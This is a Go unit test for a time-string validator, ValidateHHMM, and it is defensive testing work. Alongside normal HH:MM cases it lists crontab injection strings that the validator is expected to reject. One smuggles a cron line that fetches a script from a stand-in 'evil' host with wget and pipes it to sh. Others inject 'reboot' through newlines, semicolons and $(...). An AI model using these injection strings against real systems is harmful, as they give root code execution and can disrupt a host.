package platform

import (
	"testing"
)

func TestValidateHHMM(t *testing.T) {
	cases := []struct {
		in      string
		wantErr bool
	}{
		{"00:00", false},
		{"07:30", false},
		{"23:59", false},
		{"24:00", true},
		{"7:30", true},
		{"07:60", true},
		{"0730", true},
		{"", true},
		// crontab injection attempts (P0: root RCE via crontab)
		{"00:00\n* * * * root /bin/sh -c 'wget -qO- http://evil/x|sh' #", true},
		{"00:00\r\n* * * * root reboot", true},
		{"00:00 * * * *", true},
		{"00:00; reboot", true},
		{"$(reboot)", true},
	}
	for _, tc := range cases {
		err := ValidateHHMM(tc.in)
		if (err != nil) != tc.wantErr {
			t.Errorf("ValidateHHMM(%q) err=%v, wantErr=%v", tc.in, err, tc.wantErr)
		}
	}
}
